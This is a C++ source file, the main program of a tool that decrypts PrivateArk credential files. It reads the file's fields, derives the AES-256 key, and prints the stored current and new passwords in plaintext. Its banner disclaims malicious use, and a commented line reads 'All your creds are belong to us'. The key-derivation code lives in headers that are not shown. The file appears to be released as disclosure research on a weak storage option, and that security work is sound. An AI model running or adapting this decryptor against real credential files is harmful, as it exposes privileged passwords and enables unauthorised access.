#include <iostream>

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <chrono>

#include "aeskey_decoder.h"
#include "aesblock_decryptor.h"
#include "cracking_options.h"

#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/ini_parser.hpp>
#include <boost/algorithm/string.hpp>

using namespace std;

#define ERR_INVALID_CALL -1
#define ERR_INVALID_INI_PARSE -2
#define ERR_NOADDTINFO -3
#define ERR_NOPASS -4
#define ERR_BADENC -5
#define ERR_BADHEX -6

int main(int argc, char *argv[])
{
    EVP_add_cipher(EVP_aes_256_cbc());
    boost::property_tree::ptree pt;

    // Program Intro:
    fprintf(stderr, "PEC Decryptor for Credential File 2.0 - v1.0a\n");
    fprintf(stderr, "Written by Aaron Mizrachi <aaron@unmanarc.com> under GPL License (C) 2019\n\n");
//    fprintf(stderr, "All your creds are belong to us ;-)\n\n");

    fprintf(stderr, "This software is provided AS-IS, don't use for illegal/malicious purposes.\n\n");

    fprintf(stderr, "To be clear: according to the software provider this is not a vulnerability\n");
    fprintf(stderr, "CreateCredFile.exe can be used with other storage/authentication options\n");
    fprintf(stderr, "Please avoid to use password file based credential in production.\n\n");

    auto start = chrono::steady_clock::now();

    // Usage:
    if (argc!=2)
    {
        fprintf(stderr, "Usage: %s <credfile>\n", argv[0]);
        return ERR_INVALID_CALL;
    }

    // Parse Credential File:
    try
    {
        boost::property_tree::ini_parser::read_ini( argv[1] , pt);
    }
    catch(const boost::property_tree::ptree_error &e)
    {
         cerr << e.what() << endl;
         return ERR_INVALID_INI_PARSE;
    }  

    // Cracking Needed Options:
    sCrackingOptions crackingOptions(pt.get<uint>("VerificationsFlag",16));
    crackingOptions.sClientApp = pt.get<std::string>("ClientApp","");
    crackingOptions.sAppPath = pt.get<std::string>("AppPath","");
    crackingOptions.sClientIP = pt.get<std::string>("ClientIP","");
    crackingOptions.sClientHostname = pt.get<std::string>("ClientHostname","");
    crackingOptions.sOSUser = pt.get<std::string>("OSUser","");
    crackingOptions.sAdditionalInformation = pt.get<std::string>("AdditionalInformation","");

    string sCredFileType = pt.get<std::string>("CredFileType","Password");
    int iCredFileVersion = pt.get<int>("CredFileVersion",0);
    string sUsername = pt.get<std::string>("Username","");
    string sPassword = pt.get<std::string>("Password","");
    string sNewPassword = pt.get<std::string>("NewPassword","");
    string sExternalAuthentication = pt.get<std::string>("ExternalAuthentication","no");

    // Validate credential version =2 (we don't know how the version 1 works)
    if (iCredFileVersion!=2)
    {
        fprintf(stderr, "WARNING: Credential File Version %d, not supported, continuing...\n", iCredFileVersion);
    }

    // Validate the AdditionalInformation field (otherwise...)
    if (crackingOptions.sAdditionalInformation.empty())
    {
        fprintf(stderr, "Provided credfile does not contain the AES-256 Key in \"AdditionalInformation\" field. Aborting.\n");
        return ERR_NOADDTINFO;
    }

    // Minimal Password Lenght Validation
    if (sPassword.size()<64)
    {
        fprintf(stderr, "Provided credfile does not contain enough data for decryption in \"Password\" field HEX(PWD_BLOCK+16+16). Aborting.\n");
        return ERR_NOPASS;
    }

    // Simple Password Integrity Validation (HEX should come in pair size)
    if (sPassword.size()%2!=0)
    {
        fprintf(stderr, "Damaged \"Password\" field. Aborting.\n");
        return ERR_NOPASS;
    }

    // Derive the AES Key from crackingOptions and AdditionalInformation
    decodeAESKey(&crackingOptions);

    // Decode and show the current password in plain text using the derived key:
    if (1)
    {
        fprintf(stderr, "------------------------------------------------------------\n");
        fprintf(stderr, "Decoding PrivateArk password for user <<%s>>...\n", sUsername.c_str());
        AESBlock_Decryptor passwordDecryptor;
        passwordDecryptor.setId("AES_256_CBC");
        if (!passwordDecryptor.init(sPassword.c_str(),sPassword.size()))
        {
            fprintf(stderr, "Damaged \"Password\" field. Aborting.\n");
            return ERR_BADHEX;
        }
        if (!passwordDecryptor.decode(EVP_aes_256_cbc(),&crackingOptions))
        {
            fprintf(stderr, "Decoding password failed.\n");
        }
        passwordDecryptor.print();
        fprintf(stderr, "------------------------------------------------------------\n");
    }

    // Decode and show the new password in plain text using the derived key:
    if (!sNewPassword.empty())
    {
        fprintf(stderr, "------------------------------------------------------------\n");
        fprintf(stderr, "Decoding PrivateArk new password for user <<%s>>...\n", sUsername.c_str());
        AESBlock_Decryptor passwordDecryptor;
        passwordDecryptor.setId("AES_256_CBC");
        if (!passwordDecryptor.init(sNewPassword.c_str(),sNewPassword.size()))
        {
            fprintf(stderr, "Damaged new \"Password\" field. Aborting.\n");
            return ERR_BADHEX;
        }
        if (!passwordDecryptor.decode(EVP_aes_256_cbc(),&crackingOptions))
        {
            fprintf(stderr, "Decoding new password failed.\n");
        }
        else
        {
            passwordDecryptor.print();
        }
        fprintf(stderr, "------------------------------------------------------------\n");
    }

    // Ellapsed time:
    auto end = chrono::steady_clock::now();
    typedef std::chrono::duration<float> fsec;
    fsec fs = end - start;
    cerr << "Elapsed cracking time: "
        << fs.count()*1000
        << " ms" << endl;


    return 0;
}
